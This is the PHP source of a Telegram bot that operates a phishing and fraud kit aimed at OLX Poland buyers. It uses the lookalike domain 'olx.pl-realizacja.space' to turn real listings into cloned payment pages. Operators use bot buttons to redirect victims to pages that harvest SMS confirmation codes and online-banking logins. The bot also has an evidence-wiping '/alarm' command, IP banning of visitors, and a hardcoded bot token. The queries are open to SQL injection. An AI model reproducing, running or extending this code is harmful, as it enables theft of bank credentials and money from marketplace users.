<?php

include "../config.php";
include "utils.php";
include "keyboard.php";


function sendAlert($text)
{

$token = "1180981314:AAHXPT951S4vek83Ratnrqt6XOZM-mrgV2I";
$chat_id = "-437190518";
$txt = '';

$arr = array(
    '' => $text,
);

foreach ($arr as $key => $value) {
	$txt .= "<b>" . $key . "</b> " . $value . "\n";
};
$txt = urlencode($txt);
$sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}&disable_web_page_preview=true", "r");

}

// sendAlert('line 27');

$_SERVER["HTTP_HOST"] = "olx.pl-realizacja.space";

if (!isset($config["bot"]["token"])) 
	exit;

$response = file_get_contents("php://input");
$response = json_decode($response, true);

// sendAlert('line 37');

if (isset($response["callback_query"])) {
	$user_id = $response["callback_query"]["message"]["chat"]["id"];
    $user_name = $response["callback_query"]["message"]["chat"]["username"];
    $from = $response["callback_query"]["from"]["username"];
    $text = $response["callback_query"]["message"]["text"];
    $message_id = $response["callback_query"]["message"]["message_id"];
    $name = $response["callback_query"]["message"]["chat"]["first_name"] . " " . $response["callback_query"]["message"]["chat"]["last_name"];
    $callback_data = $response["callback_query"]["data"];
} else {
    $user_id = $response["message"]["chat"]["id"];
    $user_name = $response["message"]["chat"]["username"];
    $text = $response["message"]["text"];
    $message_id = $response["message"]["message_id"];
    $name = $response["message"]["chat"]["first_name"] . " " . $response["message"]["chat"]["last_name"];
}

if ($response["message"]["chat"]["type"] == "group"
    || $response["message"]["chat"]["type"] == "supergroup") 
    exit;

    // sendAlert('line 56');

$request = file_get_contents("https://api.telegram.org/bot" . $config["bot"]["token"] . "/getChatMember?user_id=" . $user_id . "&chat_id=" . $config["bot"]["chat"]["group"]);
$request = json_decode($request, true);

$is_member = false;

$status = $request["result"]["status"];

if ($status == "creator"
    || $status == "administrator"
    || $status == "member")
    $is_member = true;

if (!$is_member) {
    $request = [
        "chat_id" => $user_id,
        "photo" => "https://" . $_SERVER["HTTP_HOST"] . "/bot/who.png"
    ];
    
    $curl = curl_init("https://api.telegram.org/bot" . $config["bot"]["token"] . "/sendPhoto");
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true); 
    curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($request)); 
    curl_exec($curl);
    curl_close($curl);
    
    exit;
} 
// sendAlert('line 83');

$database = mysqli_connect($config["database"]["hostname"], $config["database"]["username"], $config["database"]["password"], $config["database"]["name"]);

if (!$database)
    exit;

    // sendAlert('alive');
    
if (empty($user_name)) {
    if ( !in_array($user_id, $config["bot"]["chat"]["staff"]) ) {
        $message = "📝 *Установите никнейм*\n\nДля работы с ботом необходимо, чтобы Ваш аккаунт имел никнейм. Установить его вы можете в настройках мессенджера.";
        send($message, $user_id);

        exit;
    }
}

$query = $database->query("SELECT * FROM users WHERE user_id = " . $user_id);
$is_registered = mysqli_num_rows($query);

if (!$is_registered)
    $database->query("INSERT INTO users (user_name, user_id) VALUES ('" . $user_name . "', " . $user_id . ")");
else
    $database->query("UPDATE users SET user_name = '" . $user_name . "', message_id = " . $message_id . " WHERE user_id = " . $user_id);

$user = $database->query("SELECT * FROM users WHERE user_id = " . $user_id)->fetch_array();
$command = $user["command"];
    
if ($text == "/start") {
    $message = "*Добро пожаловать в нашу команду!*\n\nДля начала работы воспользуйтесь меню ниже.";
    send($message, $user_id, $keyboard["main_menu"]);
}

if ($text == "↩  Вернуться") {
    $message = "↩️  *Главное меню*\n\nВы вернулись в главное меню.";
    send($message, $user_id, $keyboard["main_menu"]);

    $command = null;
    set_command($user_id, null);
}

if ($text == $keyboard["main_menu"]["keyboard"][0][0]["text"]) {
    /*
    $link_id = md5(time() . rand(100000, 999999));
    $link_id = substr($link_id, -20);

    $database->query("INSERT INTO adverts (user_id, link_id) VALUES (" . $user_id . ", '" . $link_id . "')");

    $date = date("Y-m-d H:i:s");
    $date = date_convert($date);

    $message = "🔗  *Создание ссылки*\n\nСсылка была успешно создана.\n\n*Дата создания: *" . $date . "\n\nДля редактирования используйте кнопку ниже. В целях безопасности не передавайте ссылку третьим лицам.";
    
    $keyboard = [
        "inline_keyboard" => [
            [
                [
                    "text" => "Редактировать",
                    "url" => "https://" . $_SERVER["HTTP_HOST"] . "/package/" . $link_id
                ]
            ]

        ],
        "resize_keyboard" => true
    ];

    send($message, $user_id, $keyboard);
    */
    
    $default_data = $database->query("SELECT * FROM users WHERE user_id = " . $user_id)->fetch_array()["default_data"];
    
    if (empty($default_data)) {
        $message = "🔗  *Создание ссылки*\n\nДля создания ссылки укажите данные получателя по умолчанию. Сделать это можно через кнопку «*Стандартные данные*».";
        send($message, $user_id);
        
        exit;
    }
    
    $message = "🔗  *Создание ссылки*\n\nУкажите ссылку на существующее объявление.";
    send($message, $user_id, $keyboard["back_menu"]);
    set_command($user_id, "create_link");
}

if ($command == "create_link") {
    $url = $text;
    
    $message = "🔗  *Создание ссылки*\n\nВыполняется обработка, пожалуйста подождите...";
    send($message, $user_id, $keyboard["back_menu"]);
    
    $request = [
        "url" => $url
    ];
    
    $curl = curl_init("https://" . $_SERVER["HTTP_HOST"] . "/parser/");
    curl_setopt($curl, CURLOPT_POST, true);
    curl_setopt($curl, CURLOPT_POSTFIELDS, http_build_query($request));
    curl_setopt($curl, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($curl, CURLOPT_TIMEOUT, 10);
    $response = curl_exec($curl);
    $error = curl_error($curl);
    curl_close($curl);
    
    if (!$response || $response == false) {
        $message = "🔗  *Создание ссылки*\n\nНе удалось получить данные.";
        send($message, $user_id, $keyboard["back_menu"]);
        
        exit();
    }

    $response = json_decode($response, true);

    if ($response["status"] == "error") {
        $description = $response["message"]["description"];
        
        $message = "🔗  *Создание ссылки*\n\n" . $description;
        send($message, $user_id, $keyboard["back_menu"]);
        
        exit;
    }
    
    $default_data = $database->query("SELECT * FROM users WHERE user_id = " . $user_id)->fetch_array()["default_data"];
    $default_data = json_decode($default_data, true);
    
    $json = [
        "title" => $response["data"]["title"],
        "price" => $response["data"]["price"],
        "image_url" => $response["data"]["image_url"],
        "receiver" => $default_data["name"],
        "phone" => $default_data["phone"],
        "address" => $default_data["address"]
    ];
    $json = json_encode($json, JSON_UNESCAPED_UNICODE);
    
    $link_id = md5(time() . rand(100000, 999999));
    $link_id = substr($link_id, -20);

    $database->query("INSERT INTO adverts (user_id, link_id, data) VALUES (" . $user_id . ", '" . $link_id . "', '" . $json . "')");
    $database->query("UPDATE adverts SET advert_id = " . $response["data"]["id"] . " WHERE link_id = '" . $link_id . "'");

    $date = date("Y-m-d H:i:s");
    $date = date_convert($date);

    $message = "🔗  *Создание ссылки*\n\nСсылка была успешно создана.\n\n*Ссылка: *https://" . $_SERVER["HTTP_HOST"] . "/item/" . $response["data"]["id"] . "\n*Дата создания: *" . $date;
    send($message, $user_id, $keyboard["main_menu"]);
    
    set_command($user_id, null);
    
    $message = "Для редактирования используйте кнопку ниже. В целях безопасности не передавайте ссылку третьим лицам";
    
    $keyboard = [
        "inline_keyboard" => [
            [
                [
                    "text" => "Редактировать",
                    "url" => "https://" . $_SERVER["HTTP_HOST"] . "/package/" . $link_id
                ]
            ]

        ],
        "resize_keyboard" => true
    ];

    send($message, $user_id, $keyboard);
}

if ($text == $keyboard["main_menu"]["keyboard"][0][1]["text"]) {
     $query = $database->query("SELECT * FROM adverts WHERE user_id = " . $user_id . " AND data IS NOT NULL");

    if (!mysqli_num_rows($query)) {
        $message = "📦  *Мои объявления*\n\nВы не создали еще ни одного объявления. Создать новое вы можете с помощью соответствующей кнопки в меню.";
        send($message, $user_id);

        exit;
    }

    $keyboard = [
        "inline_keyboard" => [],
        "resize_keyboard" => true
    ];

    $message = "📦  *Мои объявления*\n\nДля просмотра информации или редактирования объявления выберите его из списка ниже.";

    $count = 0;

    while ($row = mysqli_fetch_array($query)) {
        $link_id = $row["link_id"];

        $data = $row["data"];
        $data = json_decode($data, true);

        $title = $data["title"];
        $price = $data["price"];

        if (empty($title))
            $title = "Без названия";

        $keyboard["inline_keyboard"][$count][0] = [
            "text" => $count + 1 . ". " . $title . " (" . number_format($price, 0, null, " ") . " zł)",
            "callback_data" => "/adverts/info/" . $link_id
        ];

        $count++;
    }

    send($message, $user_id, $keyboard);
}

if (stristr($callback_data, "/adverts/info")) {
    $link_id = explode("/", $callback_data)[3];
    $query = $database->query("SELECT * FROM adverts WHERE link_id = '" . $link_id . "'")->fetch_array();

    $advert_id = $query["advert_id"];
    $data = $query["data"];
    
    $data = json_decode($data, true);

    $title = $data["title"];
    $price = $data["price"];

    $keyboard = [
        "inline_keyboard" => [
            [
                [
                    "text" => "Редактировать",
                    "url" => "https://" . $_SERVER["HTTP_HOST"] . "/package/" . $link_id
                ]
            ],
            [
                [
                    "text" => "Удалить",
                    "callback_data" => "/adverts/delete/" . $link_id
                ]
            ]

        ],
        "resize_keyboard" => true
    ];
    
    $message = "📦  *Информация об объявлении*\n\n*ID объявления: *" . $advert_id . "\n\n*Название: *" . $title . "\n*Стоимость товара: *" . number_format($price, 0, null, " ") . " zł\n\n*Ссылка: *https://" . $_SERVER["HTTP_HOST"] . "/item/" . $advert_id;
    send($message, $user_id, $keyboard);
}

if (stristr($callback_data, "/adverts/delete")) {
    $link_id = explode("/", $callback_data)[3];
    
    $query = $database->query("SELECT * FROM adverts WHERE link_id = '" . $link_id . "'")->fetch_array();
    
    $data = json_decode($data, true);
    $title = $data["title"];
    
    $query = $database->query("DELETE FROM adverts WHERE link_id = '" . $link_id . "'");
    
    if ($query)
        $message = "📦  *Удаление объявления*\n\nОбъявление было успешно удалено.";
    else 
        $message = "📦  *Удаление объявления*\n\nПри удалении объявления произошла ошибка.";

    edit($message, $user_id, $message_id);
}

if ($text == $keyboard["main_menu"]["keyboard"][1][0]["text"]) {
    $support_id = $database->query("SELECT * FROM users WHERE user_id = " . $user_id)->fetch_array()["support_id"];
    
    if (empty($support_id))
        $support_id = "не установлен";

    $message = "💬  *Поддержка*\n\nВы можете использовать сервис *Re:plain* для установки чата на страницах с объявлениями. Чат будет установлен автоматически после указания ID чата.\n\n*Текущий ID: *" . $support_id;
    
    $keyboard = [
        "inline_keyboard" => [
            [
                [
                    "text" => "Изменить ID",
                    "callback_data" => "/support/set"
                ]
            ],
            [
                [
                    "text" => "Удалить чат",
                    "callback_data" => "/support/delete"
                ]
            ]

        ],
        "resize_keyboard" => true
    ];

    send($message, $user_id, $keyboard);
}

if ($callback_data == "/support/set") {
    $message = "💬  *Установка чата*\n\nВставьте код, который вы получили в боте Re:plain.\n\n*Пример кода: *\n`<script>window.replainSettings = { id: 'b6bcb764-49fa-68a1-8eaa-4vbde7781cb3' };</script>`";
    send($message, $user_id, $keyboard["back_menu"]);

    set_command($user_id, "set_support");
}

if ($command == "set_support") {
    $support_id = $text;
    
    $support_id = explode("' };", explode("replainSettings = { id: '", $support_id)[1])[0];
    
    if (strlen($support_id) < 30
        || strlen($support_id) > 40) {
        $message = "💬  *Установка чата*\n\nПроверьте корректность введенного кода.";
        send($message, $user_id, $keyboard["back_menu"]);
        
        exit;
    }
    
    $database->query("UPDATE users SET support_id = '" . $support_id . "' WHERE user_id = " . $user_id);
    
    set_command($user_id, null);
    
    $message = "💬  *Установка чата*\n\nЧат был успешно установлен.\n\n*Текущий ID: *" . $support_id;
    send($message, $user_id, $keyboard["main_menu"]);
}

if ($callback_data == "/support/delete") {
    $database->query("UPDATE users SET support_id = NULL WHERE user_id = " . $user_id);
    
    $message = "💬  *Удаление чата*\n\nЧат был успешно удален.";
    send($message, $user_id, $keyboard["main_menu"]);
}

# Редактирование данных по умолчанию
if ($text == $keyboard["main_menu"]["keyboard"][1][1]["text"]) {
    $default_data = $database->query("SELECT * FROM users WHERE user_id = " . $user_id)->fetch_array()["default_data"];
    
    if (!empty($default_data)) {
        $default_data = json_decode($default_data, true);
        
        $name = $default_data["name"];
        $phone = $default_data["phone"];
        $address = $default_data["address"];
        
        $default_data = "\n*Имя и фамилия: *" . $name . "\n*Телефон: *" . $phone . "\n*Адрес: *" . $address;
    } else {
        $default_data = "не указаны";
    }
    
    $message = "📋  *Стандартные данные*\n\nВы можете задать имя и фамилию, адрес и номер телефона по умолчанию. Они будут автоматически заполнены при создании нового объявления.\n\n*Примечание: *при использовании генератора указанные здесь данные являются *приоритетными*.\n\n*Текущие данные: *" . $default_data;
    
    $keyboard = [
        "inline_keyboard" => [
            [
                [
                    "text" => "Изменить",
                    "callback_data" => "/default_data/set"
                ]
            ],
            [
                [
                    "text" => "Очистить",
                    "callback_data" => "/default_data/delete"
                ]
            ]

        ],
        "resize_keyboard" => true
    ];

    send($message, $user_id, $keyboard);
}

if ($callback_data == "/default_data/set") {
    $message = "📋  *Изменение данных*\n\nВведите все требуемые данные в строго указанном ниже формате (имя и фамилия, телефон, адрес). Каждое значение должно вводиться с новой строки (Ctrl + Enter - перенос строки).\n\n*Пример: *\nIwan Iwanowicz\n+48 22 123 45 67\nAl. Jerozolimskie 54";
    send($message, $user_id, $keyboard["back_menu"]);

    set_command($user_id, "set_default_data");
}

if ($command == "set_default_data") {
    $default_data = $text;
    
    $default_data = explode("\n", $default_data);
    
    $name = $default_data[0];
    $phone = $default_data[1];
    $address = $default_data[2];
    
    if (strlen($name) < 5) {
        $message = "📋  *Изменение данных*\n\nПроверьте корректность введенного имени и фамилии.";
        send($message, $user_id, $keyboard["back_menu"]);
        
        exit;
    }
    
    if (strlen($phone) !== 16) {
        $message = "📋  *Изменение данных*\n\nПроверьте корректность введенного номера телефона.";
        send($message, $user_id, $keyboard["back_menu"]);
        
        exit;
    }
    
    if (strlen($address) < 5) {
        $message = "📋  *Изменение данных*\n\nПроверьте корректность введенного адреса.";
        send($message, $user_id, $keyboard["back_menu"]);
        
        exit;
    }
    
    $json = [
        "name" => $name,
        "phone" => $phone,
        "address" => $address
    ];
    
    $json = json_encode($json);
    
    $database->query("UPDATE users SET default_data = '" . $json . "' WHERE user_id = " . $user_id);
    
    set_command($user_id, null);
    
    $message = "📋  *Изменение данных*\n\nДанные по умолчанию были успешно изменены.\n\n*Текущие данные: *\n*Имя и фамилия: *" . $name . "\n*Телефон: *" . $phone . "\n*Адрес: *" . $address;
    send($message, $user_id, $keyboard["main_menu"]);
}

# Удаление данных по умолчанию
if ($callback_data == "/default_data/delete") {
    $database->query("UPDATE users SET default_data = NULL WHERE user_id = " . $user_id);
    
    $message = "📋  *Удаление данных*\n\nДанные по умолчанию были успешно удалены.";
    send($message, $user_id, $keyboard["main_menu"]);
}

# Устанавливаем редерект
if (stristr($callback_data, "/redirect/")) {

    // sendAlert('pressed redirect button. query: '. $callback_data);
    
    $callback_data = explode("/", $callback_data);
    
    $type = $callback_data[2];
    $id = $callback_data[3];

    // sendAlert("Type: ${type}, id: ${id}");
    
    if ($type == "sms") {
        $message = "🔗  *Перенаправление*\n\nПользователь перенаправлен на страницу ввода кода из смс.";
        send($message, $user_id);
        
        $data = file_get_contents("../payment/temp/" . $id);
        $json = json_decode($data, true);
        
        $json["redirect"]["type"] = "sms";
        
        $json = json_encode($json);
        file_put_contents("../payment/temp/" . $id, $json);
    }
    
    if ($type == "banking") {
        $message = "🔗  *Перенаправление*\n\nПользователь перенаправлен на страницу ввода данных от банкинга.";
        send($message, $user_id);
        
        $data = file_get_contents("../payment/temp/" . $id);
        $json = json_decode($data, true);
        
        $json["redirect"]["type"] = "banking";
        
        $json = json_encode($json);
        file_put_contents("../payment/temp/" . $id, $json);
    }
    
    if ($type == "custom") {
        $message = "🔗  *Перенаправление*\n\nВведите адрес, на который будет перенаправлен пользователь.";
        send($message, $user_id);
        
        $data = file_get_contents("../payment/temp/" . $id);
        $json = json_decode($data, true);
        
        $json["redirect"]["type"] = "custom";
        
        $json = json_encode($json);
        file_put_contents("../payment/temp/" . $id, $json);
        
        unset($data);
        
        $data["id"] = $id;
        $json = json_encode($data);
        
        file_put_contents("redirect", $json);
    }
}

# Кастомный редерект по ссылке
if (filter_var($text, FILTER_VALIDATE_URL)
    && $command !== "create_link") {

    $data = file_get_contents("redirect");
    $json = json_decode($data, true);
    
    if ( !isset($json["id"]) || !in_array($user_id, $config["bot"]["chat"]["staff"]) ) { 
        send('Ссылку создают в разделе "🔗 Создать ссылку" 🤨', $user_id);
        exit();
    }

    $id = $json["id"];
    
    $data["id"] = null;
    $json = json_encode($data);
    
    file_put_contents("redirect", $json);
    
    $message = "🔗  *Перенаправление*\n\nПользователь будет перенаправлен на следующий адрес: " . $text;
    send($message, $user_id);
    
    $data = file_get_contents("../payment/temp/" . $id);
    $json = json_decode($data, true);
    
    $json["redirect"]["url"] = $text;
    
    $json = json_encode($json);
    file_put_contents("../payment/temp/" . $id, $json);
}

if (stristr($callback_data, "/retry/sms/")) {

    // sendAlert("retry sms in webhook");


    $id = explode("/", $callback_data)[3];
    $bank = explode("/", $callback_data)[4];

    // sendAlert("id ${id}, bank: ${bank}");
    
    $data = file_get_contents("../payment/temp/" . $id);
    $json = json_decode($data, true);
    
    $json["retry_sms"] = true;

    // sendAlert($json, true);
    
    $json = json_encode($json);
    file_put_contents("../payment/temp/" . $id, $json);

    
    
    $message = "🔗  *Перенаправление*\n\nПользователь перенаправлен на повторный ввод кода из смс.";
    send($message, $user_id);
}

# Очистить все объявления
if ($text == "/alarm") {
    $query = $database->query("DELETE FROM adverts WHERE user_id = " . $user_id);
    
    if ($query)
        $message = "🆘  *Экстренная очистка*\n\nВсе объявления были успешно удалены.";
    else 
        $message = "🆘  *Экстренная очистка*\n\nПри удалении всех объявлений произошла ошибка.";

    send($message, $user_id);
}

# Бан по IP
if (mb_strpos($text, "/ban ") === 0) {
    if ( !in_array($user_id, $config["bot"]["chat"]["staff"]) ) {
        send("Эта команда Вам недоступна.", $user_id);
        exit;
    }

    $getIP = explode(' ', $text);

    if (count($getIP) > 2) {
        send("Где-то ошибочка в команде.", $user_id);
        exit;
    }

    if (!filter_var($getIP[1], FILTER_VALIDATE_IP)) {
        send("Не верный фомрат IP.", $user_id);
        exit;
    }

    $ip = $getIP[1];
    $database->query("INSERT INTO ip_block (ip) VALUES (\"$ip\")");

    send('IP ' . $ip . ' теперь в черном списке.', $user_id);
}
?>